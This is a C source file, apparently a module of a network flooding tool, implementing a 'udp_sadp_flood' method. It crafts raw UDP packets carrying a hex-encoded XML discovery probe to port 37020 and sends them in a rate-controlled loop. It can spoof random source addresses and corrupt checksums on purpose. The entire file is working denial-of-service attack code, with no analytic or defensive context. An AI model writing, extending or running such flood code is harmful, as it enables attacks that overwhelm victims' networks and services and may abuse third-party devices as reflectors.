#include "../../include/methods.h"

static struct udphdr		*udp;
static struct iphdr		*ip;
static u_char			frame[65535];

static u_char PAYLOAD[]="\x3c\x3f\x78\x6d\x6c"
	"\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d"
	"\x27\x31\x2e\x30\x27\x20\x65\x6e\x63"
	"\x6f\x64\x69\x6e\x67\x3d\x27\x75\x74"
	"\x66\x2d\x38\x27\x3f\x3e\x3c\x50\x72"
	"\x6f\x62\x65\x3e\x3c\x55\x75\x69\x64"
	"\x3e\x73\x74\x72\x69\x6e\x67\x3c\x2f"
	"\x55\x75\x69\x64\x3e\x3c\x54\x79\x70"
	"\x65\x73\x3e\x69\x6e\x71\x75\x69\x72"
	"\x79\x3c\x2f\x54\x79\x70\x65\x73\x3e"
	"\x3c\x2f\x50\x72\x6f\x62\x65\x3e";

static void inline for_iteration(method_args_t *a)
{
	/* not dstport */
	if (a->o->OPT_SOURCE[0]=='\a')
		ip->saddr=random_ipv4();
	udp->uh_sport=(a->o->OPT_SRCPORT==ARANDVAL)?
		htons(random_u16()):htons(a->o->OPT_SRCPORT);
	ip->id=htons(random_u16());

	ip->check=0;
	ip->check=in_check((u_short*)ip,sizeof(*ip));

	udp->uh_sum=0;
	udp->uh_sum=ip4_pseudocheck(ip->saddr, ip->daddr,
		IPPROTO_UDP, (ntohs(udp->uh_ulen)), udp);

	if (a->o->OPT_BADSUM==ARANDVAL) {
		if (randnum(0,1)==0)
			--udp->uh_sum;
	}
	else if (a->o->OPT_BADSUM==1)
		--udp->uh_sum;
}

void udp_sadp_flood(method_args_t *a)
{
	memset(frame,0,sizeof(frame));
	memcpy(frame,a->machdr,14);
	ip=(struct iphdr*)(frame+14);
	udp=(struct udphdr*)(frame+14+(sizeof(struct iphdr)));

	ip->ihl=5;
	ip->version=4;
	ip->tos=0;
	ip->ttl=100;
	ip->frag_off=0;
	ip->protocol=IPPROTO_UDP;
	ip->saddr=a->source;
	ip->daddr=a->target;
	ip->tot_len=htons((sizeof(struct iphdr)+
		sizeof(struct udphdr))+(sizeof(PAYLOAD)-1));
	udp->uh_ulen=htons(sizeof(struct udphdr)+(sizeof(PAYLOAD)-1));
	udp->uh_dport=htons(37020);
	memcpy((frame+14+(sizeof(struct udphdr)+sizeof(struct iphdr))),
		PAYLOAD,(sizeof(PAYLOAD)-1));

	FLOODRUN(a,for_iteration(a),ethsend(a->fd,frame,ntohs(ip->tot_len)+14),
		a->o->OPT_PPS,a->o->OPT_TIME,a->o->OPT_UNLIMIT);
}
